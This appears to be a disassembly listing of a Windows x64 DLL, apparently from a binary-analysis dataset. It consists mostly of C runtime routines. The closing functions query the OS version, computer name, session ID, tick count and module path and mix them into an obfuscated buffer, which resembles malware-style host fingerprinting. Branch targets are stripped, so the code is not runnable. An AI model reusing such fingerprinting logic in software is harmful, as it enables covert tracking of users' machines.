and edi edx
inc [ rbx + rsi + 0xc ]
sub_180015ee0
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_180016a08
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_180015f3c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x50
xor r12d r12d
mov rsi r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r12b
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_18000cd7c
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
test rcx rcx
je r-xdata
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
call sub_180013c94
test eax eax
je r-xdata
test rbx rbx
je r-xdata
mov [ rcx ] r12w
mov eax r12d
mov r9d 0x1
test rbx rbx
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov rax [ rbp - 0x20 ]
mov [ rsp + 0x20 ] rbx
mov ecx [ rax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbp - 0x20 ]
mov r9d [ rcx + 0x10c ]
cmp r9d 0x1
jle r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
jmp r-xdata
movsxd rax [ rcx + 0x10c ]
cmp rsi rax
jb r-xdata
cmp esi r9d
jl r-xdata
mov eax 0x1
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_18000ea3c
mov [ rax ] 0x2a
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rdi + 0x1 ] r12b
je r-xdata
mov ecx [ rcx + 0x4 ]
mov eax r12d
test rbx rbx
setne al
mov r8 rdi
mov edx 0x9
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov rcx [ rbp - 0x20 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x50
pop rbp
retn
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov eax [ rcx + 0x10c ]
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_1800160bc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor edi edi
lea ecx [ rdi + 0x1 ]
call sub_180012fa4
nop
lea ebx [ rdi + 0x3 ]
mov ecx 0x1
call sub_180012ea4
mov eax edi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rcx [ rax + rsi * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
cmp ebx 0x14
jl r-xdata
call sub_180016ae4
cmp eax 0xffffffff
je r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rsi * 8 ]
add rcx 0x30
call [ DeleteCriticalSection@IAT ]
mov rcx [ rw-data ]
mov rcx [ rcx + rsi * 8 ]
call sub_18000ec1c
mov r11 [ rw-data ]
and [ r11 + rsi * 8 ] 0x0
inc edi
mov [ rsp + 0x24 ] edi
sub_180016168
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rcx + 0x18 ]
xor esi esi
mov rbx rcx
and al 0x3
cmp al 0x2
jne r-xdata
mov rcx [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov eax esi
mov rsi [ rsp + 0x38 ]
mov [ rbx ] rcx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test [ rcx + 0x18 ] 0x108
je r-xdata
mov edi [ rcx ]
sub edi [ rcx + 0x10 ]
test edi edi
jle r-xdata
call sub_180013c6c
mov rdx [ rbx + 0x10 ]
mov r8d edi
mov ecx eax
call sub_1800138c4
cmp eax edi
jne r-xdata
or [ rbx + 0x18 ] 0x20
or esi 0xffffffff
mov eax [ rbx + 0x18 ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ rbx + 0x18 ] eax
jmp r-xdata
sub_1800161e4
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
call sub_180016168
test eax eax
je r-xdata
add rsp 0x20
pop rbx
jmp sub_180016230
test [ rbx + 0x18 ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov rcx rbx
call sub_180013c6c
mov ecx eax
call sub_180016b4c
neg eax
sbb eax eax
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180016230
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov r13d ecx
xor esi esi
xor edi edi
lea ecx [ rsi + 0x1 ]
call sub_180012fa4
nop
xor ebx ebx
or r15d 0xffffffff
mov ecx 0x1
call sub_180012ea4
cmp r13d 0x1
cmove edi esi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
movsxd r12 ebx
mov rax [ rw-data ]
cmp [ rax + r12 * 8 ] 0x0
je r-xdata
inc ebx
jmp r-xdata
mov rdx [ rax + r12 * 8 ]
test [ rdx + 0x18 ] 0x83
je r-xdata
mov [ rsp + 0x20 ] ebx
cmp ebx [ rw-data ]
jge r-xdata
mov ecx ebx
call sub_180013bcc
nop
mov rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x18 ] 0x83
je r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + r12 * 8 ]
mov ecx ebx
call sub_180013c4c
cmp r13d 0x1
jne r-xdata
test r13d r13d
jne r-xdata
call sub_1800161e4
cmp eax r15d
je r-xdata
test [ rcx + 0x18 ] 0x2
je r-xdata
inc esi
mov [ rsp + 0x24 ] esi
jmp r-xdata
call sub_1800161e4
cmp eax r15d
cmove edi r15d
mov [ rsp + 0x28 ] edi
sub_180016334
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
push r12
sub rsp 0x20
mov rbx rcx
call sub_180013c6c
mov ecx eax
call sub_1800139f8
test eax eax
je r-xdata
xor eax eax
call sub_180013a58
add rax 0x30
cmp rbx rax
jne r-xdata
call sub_180013a58
add rax 0x60
cmp rbx rax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
inc [ rw-data ]
test [ rbx + 0x18 ] 0x10c
jne r-xdata
lea r12 [ rw-data ]
movsxd rdi eax
cmp [ r12 + rdi * 8 ] 0x0
jne r-xdata
mov rcx [ r12 + rdi * 8 ]
mov [ rbx + 0x24 ] 0x1000
mov [ rbx + 0x8 ] 0x1000
mov [ rbx + 0x10 ] rcx
mov [ rbx ] rcx
mov ecx 0x1000
call sub_18000f72c
mov [ r12 + rdi * 8 ] rax
test rax rax
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rdi [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x10 ] rax
mov [ rbx ] rax
mov eax 0x2
mov [ rbx + 0x24 ] eax
mov [ rbx + 0x8 ] eax
jmp r-xdata
or [ rbx + 0x18 ] 0x1102
mov eax 0x1
jmp r-xdata
sub_180016408
test ecx ecx
je r-xdata
retn
push rbx
sub rsp 0x20
test [ rdx + 0x18 ] 0x1000
mov rbx rdx
je r-xdata
add rsp 0x20
pop rbx
mov rcx rdx
call sub_180016168
and [ rbx + 0x18 ] 0xffffeeff
and [ rbx + 0x24 ] 0x0
and [ rbx ] 0x0
and [ rbx + 0x10 ] 0x0
sub_180016440
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 rdx
mov rdx rcx
lea rcx [ rbp - 0x20 ]
mov r13d r9d
mov r14 r8
call sub_18000cd7c
test r14 r14
je r-xdata
test r15 r15
jne r-xdata
mov [ r14 ] r15
test r13d r13d
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
cmp [ rbp - 0x8 ] 0x0
jmp r-xdata
mov r12b [ r15 ]
mov r8 [ rbp - 0x20 ]
xor edi edi
lea rbx [ r15 + 0x1 ]
cmp r13d 0x2
jl r-xdata
je r-xdata
mov rax [ r8 + 0x140 ]
movzx ecx r12b
movzx eax [ rax + rcx * 2 ]
and eax 0x8
lea r8 [ rbp - 0x20 ]
movzx ecx r12b
mov edx 0x8
call sub_1800167d0
mov r8 [ rbp - 0x20 ]
jmp r-xdata
cmp r13d 0x24
jg r-xdata
xor eax eax
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov esi [ rbp + 0x50 ]
cmp r12b 0x2d
jne r-xdata
mov r12b [ rbx ]
inc rbx
jmp r-xdata
test eax eax
je r-xdata
cmp r12b 0x2b
jne r-xdata
or esi 0x2
jmp r-xdata
cmp [ r8 + 0x10c ] 0x1
jle r-xdata
test r13d r13d
js r-xdata
mov r12b [ rbx ]
inc rbx
test r14 r14
je r-xdata
cmp r13d 0x1
je r-xdata
cmp [ rbp - 0x8 ] dil
mov [ r14 ] r15
cmp r13d 0x24
jg r-xdata
test r13d r13d
jne r-xdata
cmp r13d 0x10
jne r-xdata
cmp r12b 0x30
je r-xdata
mov r10 [ r8 + 0x140 ]
xor edx edx
or eax 0xffffffff
div r13d
mov r9d eax
cmp r12b 0x30
jne r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0xa
jmp r-xdata
and r8d 0x103
je r-xdata
movsx ecx r12b
sub ecx 0x30
jmp r-xdata
cmp [ rbx ] 0x78
je r-xdata
mov r13d 0x10
jmp r-xdata
cmp [ rbx ] 0x58
je r-xdata
dec rbx
test sil 0x8
jne r-xdata
lea eax [ r12 - 0x61 ]
movsx ecx r12b
cmp al 0x19
ja r-xdata
cmp ecx r13d
jae r-xdata
mov r12b [ rbx + 0x1 ]
add rbx 0x2
cmp [ rbx ] 0x58
jne r-xdata
mov r13d 0x8
jmp r-xdata
mov r12d 0x7fffffff
test sil 0x4
jne r-xdata
test r14 r14
cmovne rbx r15
xor edi edi
jmp r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or esi 0x8
cmp edi r9d
jb r-xdata
call sub_18000ea3c
mov [ rax ] 0x22
test sil 0x1
je r-xdata
test sil 0x1
jne r-xdata
test r14 r14
je r-xdata
imul edi r13d
add edi ecx
jne r-xdata
mov al sil
and al 0x2
neg al
sbb edi edi
neg edi
add edi r12d
or edi 0xffffffff
jmp r-xdata
mov eax esi
and eax 0x2
je r-xdata
test sil 0x2
je r-xdata
mov [ r14 ] rbx
movzx ecx r12b
movzx r8d [ r10 + rcx * 2 ]
mov ecx r8d
and ecx 0x4
je r-xdata
or esi 0x4
test r14 r14
jne r-xdata
cmp ecx edx
jbe r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
neg edi
mov r12b [ rbx ]
inc rbx
jmp r-xdata
cmp edi r12d
jbe r-xdata
mov eax edi
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
sub_1800166ac
sub rsp 0x38
xor eax eax
mov r9d r8d
mov r8 rdx
cmp [ rw-data ] eax
mov [ rsp + 0x20 ] eax
mov rdx rcx
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_180016440
add rsp 0x38
retn
sub_1800166dc
sub rsp 0x38
cmp [ rw-data ] 0x0
mov r9d r8d
mov r8 rdx
mov rdx rcx
mov [ rsp + 0x20 ] 0x1
jne r-xdata
xor ecx ecx
lea rcx [ rw-data ]
jmp r-xdata
call sub_180016440
add rsp 0x38
retn
sub_180016710
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bl
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bl
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bl
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
mov al [ r10 ]
mov [ r11 + r10 ] al
inc r10
test al al
je r-xdata
jmp r-xdata
mov al [ r10 + r11 ]
mov [ r11 ] al
inc r11
test al al
je r-xdata
mov [ rcx ] bl
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] bl
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_1800167d0
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_18000cd7c
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_180013c94
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_180015504
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_1800168b8
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_18000ea3c
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10b
je r-xdata
mov [ rcx ] r10b
test rdx rdx
jne r-xdata
inc rcx
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10b
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10b
call sub_18000ea3c
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
mov [ rcx + r8 ] al
inc r8
test al al
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18000e9d4
mov eax ebx
sub_180016950
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180016a68
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_180016168
mov rcx rbx
mov edi eax
call sub_180016da4
mov rcx rbx
call sub_180013c6c
mov ecx eax
call sub_180016ce0
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_18000ec1c
and [ rbx + 0x28 ] 0x0
sub_180016ae4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
call sub_180013b68
nop
mov rcx rbx
call sub_180016a68
mov edi eax
mov rcx rbx
call sub_180013c00
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_180016b4c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180015e10
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_180015d9c
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180015eb8
mov eax ebx
jmp r-xdata
call sub_18000ea5c
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_180016c24
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_180015d9c
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_18000ea7c
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_180015d9c
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_180015d9c
mov ecx 0x1
mov rbx rax
call sub_180015d9c
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180015cf0
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_180016ce0
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_180015e10
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_180016c24
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_180015eb8
mov eax edi
jmp r-xdata
sub_180016da4
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_18000ec1c
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_180016de0
sub rsp 0xd8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x98
call sub_18000bd10
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x9c
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov ecx [ rsp + 0x24 ]
cmp ecx 0x5
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] 0x94
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
cmp ecx 0x6
jne r-xdata
mov eax [ rsp + 0x28 ]
cmp eax 0x2
jne r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
mov eax [ rw-data ]
mov edx 0x8
cmp ecx 0x4
cmovbe eax edx
mov eax [ rsp + 0x28 ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ rcx + 0x3b ]
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rsp + 0xba ] 0x1
mov eax 0x200
mov ecx 0x80
cmove eax ecx
jmp r-xdata
test eax eax
jne r-xdata
mov eax 0x20
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
add rsp 0xd8
retn
cmp [ rsp + 0xba ] 0x1
mov eax 0x400
mov ecx 0x100
cmove eax ecx
jmp r-xdata
mov eax 0x10
jmp r-xdata
sub_180016f20
push rbx
sub rsp 0x20
mov rbx rdx
mov rdx rcx
mov r8d 0x64
mov rcx rbx
call sub_18000be10
mov edx 0x3a
mov rcx rbx
call sub_18000c334
test rax rax
jne r-xdata
lea rcx [ rax + 0x1 ]
mov [ rax ] 0x0
add rsp 0x20
pop rbx
jmp sub_180015ce4
mov eax 0x50
add rsp 0x20
pop rbx
retn
sub_180016f90
push rbx
sub rsp 0x20
call sub_1800179f0
mov rcx [ rw-data ]
mov ebx eax
test rcx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
call rcx
test ebx ebx
je r-xdata
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_180017c20
add rsp 0x20
pop rbx
jmp sub_1800179c0
sub_180016fe0
sub rsp 0x58
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
mov [ rsp + 0x50 ] rbx
call [ GetProcAddress@IAT ]
mov rbx rax
test rax rax
je r-xdata
add rsp 0x58
retn
xor eax eax
mov rbx [ rsp + 0x50 ]
add rsp 0x58
retn
xor edx edx
lea rcx [ rsp + 0x24 ]
mov [ rsp + 0x20 ] 0x0
lea r8d [ rdx + 0x2c ]
call sub_18000bd10
lea rcx [ rsp + 0x20 ]
call rbx
movzx r11d [ rsp + 0x20 ]
cmp r11w 0x9
je r-xdata
mov eax 0x1
mov rbx [ rsp + 0x50 ]
add rsp 0x58
retn
cmp r11w 0x6
je r-xdata
sub_180017070
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
push rbp
lea rbp [ rsp - 0x730 ]
sub rsp 0x830
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x720 ] rax
lea rcx [ rsp + 0x31 ]
xor edx edx
mov r8d 0x3ff
call sub_18000bd10
xor ebx ebx
mov eax 0x200
mov [ rsp + 0x36 ] 0xffffffff
mov [ rsp + 0x3a ] 0x416
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x34 ] ax
mov [ rbp + 0x26 ] ebx
call sub_180016de0
mov [ rsp + 0x78 ] eax
call sub_180016fe0
test eax eax
je r-xdata
lea rcx [ rbp + 0x331 ]
xor edx edx
mov r8d 0x3e7
mov [ rbp + 0x330 ] bl
call sub_18000bd10
lea rcx [ rbp + 0x330 ]
call sub_180018670
call [ GetTickCount@IAT ]
or rcx 0xffffffffffffffff
lea rdi [ rbp + 0x330 ]
mov r11d eax
mov [ rsp + 0x30 ] eax
xor eax eax
mov edx ebx
mov r8 rbx
[ rdi ]
mov edi ebx
not rcx
dec rcx
movsxd r10 ecx
test ecx ecx
jle r-xdata
or [ rsp + 0x78 ] 0x80000000
not r11d
lea rdx [ rbp + 0x330 ]
lea rcx [ rsp + 0x46 ]
lea eax [ r11 + rdi + 0x123 ]
mov r8d 0x31
mov [ rsp + 0x3e ] eax
call sub_18000be10
mov rdx rbx
lea rdi [ rw-data ]
nop
movsx ecx [ rbp + r8 + 0x330 ]
lea r9d [ rdx + 0x1 ]
mov eax ecx
imul eax r9d
add edi eax
and edx 0x80000001
jge r-xdata
movzx eax [ rdx + rdi + 0x108 ]
inc rdx
mov [ rbp + rdx + 0x47 ] al
test al al
jne r-xdata
mov rcx rbx
nop [ rax + rax ] ax
test edx edx
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
movzx eax [ rcx + rdi + 0x148 ]
inc rcx
mov [ rbp + rcx + 0x83 ] al
test al al
jne r-xdata
mov rcx rbx
nop [ rax ] eax
cmp cl 0x2d
jne r-xdata
imul edi edi 0x11
movzx eax [ rcx + rdi + 0x128 ]
inc rcx
mov [ rbp + rcx + 0x65 ] al
test al al
jne r-xdata
lea rdx [ rsp + 0x24 ]
lea rcx [ rsp + 0x7c ]
mov [ rsp + 0x24 ] 0x3f
call [ GetComputerNameA@IAT ]
mov [ rsp + 0x20 ] ebx
call [ GetCurrentProcessId@IAT ]
lea rdx [ rsp + 0x20 ]
mov ecx eax
call [ ProcessIdToSessionId@IAT ]
mov ecx [ rsp + 0x20 ]
lea rdx [ rbp + 0x1a0 ]
call sub_180017f60
lea rdx [ rbp + 0x258 ]
mov r8d 0xff
xor ecx ecx
mov [ rbp + 0x254 ] 0x400001
call [ GetModuleFileNameA@IAT ]
lea rcx [ rsp + 0x30 ]
call sub_180017950
mov rcx [ rbp + 0x720 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x830 ]
mov rbx [ r11 + 0x10 ]
mov rdi [ r11 + 0x18 ]
mov rsp r11
pop rbp
retn
inc r8
mov edx r9d
cmp r8 r10
jl r-xdata
add edi 0x44
